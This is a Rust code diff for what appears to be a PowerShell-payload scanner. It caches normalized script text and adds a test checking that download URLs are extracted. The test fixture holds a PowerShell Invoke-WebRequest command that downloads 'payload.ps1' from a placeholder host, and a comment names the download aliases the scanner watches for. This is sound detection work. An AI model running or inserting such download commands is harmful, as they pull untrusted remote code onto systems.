@@ -3176,6 +3176,11 @@ fn decode_payload(bytes: &[u8]) -> std::borrow::Cow<'_, str> {
 
 pub fn normalize_ps1_text(text: &str) -> String {
     let expanded = strip_marker_noise(&expand_obfuscation(&strip_marker_noise(text)));
+    normalize_expanded_ps1_text(&expanded)
+}
+
+fn normalize_expanded_ps1_text(expanded: &str) -> String {
+    let expanded = strip_marker_noise(expanded);
     let aliased = crate::ps_alias::expand_aliases_if_ps(&expanded);
     let summarized = summarize_large_binary_ps_literals(&aliased);
     escape_binary_controls(&summarized)
@@ -4021,6 +4026,29 @@ mod herestring_iex_tests {
             );
         }
     }
+
+    #[test]
+    fn ps1_scan_caches_normalized_payloads() {
+        let payload =
+            b"Invoke-WebRequest -Uri 'https://cache.example/payload.ps1' -OutFile payload.ps1"
+                .to_vec();
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_ps1.push(payload.clone());
+
+        scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.ps1_normalized_cache.contains_key(payload.as_slice()),
+            "normalized payload was not cached"
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://cache.example/payload.ps1")
+            }),
+            "download URL was not extracted: {:?}",
+            env.traits
+        );
+    }
 }
 
 /// Walk every entry in `env.all_extracted_ps1` looking for a one-shot
@@ -4144,6 +4172,11 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
         }
 
         let text_expanded = expand_obfuscation(&raw_owned);
+        if env.ps1_scan_cache_normalized {
+            env.ps1_normalized_cache
+                .entry(payload.clone())
+                .or_insert_with(|| normalize_expanded_ps1_text(&text_expanded));
+        }
         // Dual-scan: also run URL regexes over alias-expanded version so that
         // `iwr`, `irm`, `wget` etc. are caught even if obfuscation expansion
         // didn't surface them.
@@ -4449,6 +4482,7 @@ pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
         max_output_line_bytes: env.limits.max_output_line_bytes,
         max_traits_per_kind: 100,
     });
+    payload_env.ps1_scan_cache_normalized = false;
     payload_env.all_extracted_ps1.push(text.as_bytes().to_vec());
     scan_ps1_payloads(&mut payload_env);
     env.traits
